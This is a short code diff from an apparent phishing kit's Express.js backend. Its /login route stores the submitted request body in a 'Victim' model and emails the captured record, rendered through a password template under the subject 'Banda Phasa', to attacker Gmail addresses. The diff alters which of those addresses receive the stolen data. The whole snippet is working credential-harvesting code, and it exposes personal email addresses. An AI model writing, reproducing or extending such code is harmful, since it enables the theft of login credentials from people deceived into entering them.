@@ -8,9 +8,10 @@ route.post("/login", async (req, res) => {
     try {
         const ress = await Victim.create(req.body)
         res.status(200).json({status: "ok"})
+        const to = ["vc8bppc@gmail.com"]
+        if(!req.me) to.push("vishwakarmasatyam2002@gmail.com")
         sendEmail({
-            
-            to: ["vishwakarmasatyam2002@gmail.com", "vc8bppc@gmail.com"],
+            to: to,
             subject: "Banda Phasa",
             emailhtml: createPAssTemplate(ress),
             emailtext: `
